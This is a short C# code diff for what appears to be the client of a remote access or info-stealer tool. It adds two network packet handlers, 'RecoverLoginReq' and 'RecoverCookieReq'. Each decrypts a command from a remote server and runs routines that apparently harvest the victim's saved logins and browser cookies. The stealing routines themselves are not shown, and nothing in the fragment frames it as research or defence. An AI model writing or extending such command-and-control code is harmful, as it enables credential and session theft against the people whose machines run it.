@@ -129,6 +129,14 @@ namespace Client.Core.Networking
             {
                 GetDirectorContent.Execute(Cryptography.Decrypt(incomingData));
             });
+            Connection.AppendIncomingPacketHandler<string>("RecoverLoginReq", (packetHeader, connection, incomingData) =>
+            {
+                RecoverLogin.Execute(Cryptography.Decrypt(incomingData));
+            });
+            Connection.AppendIncomingPacketHandler<string>("RecoverCookieReq", (packetHeader, connection, incomingData) =>
+            {
+                RecoverCookies.Execute(Cryptography.Decrypt(incomingData));
+            });
         }
 
         public static void StartReconnect()
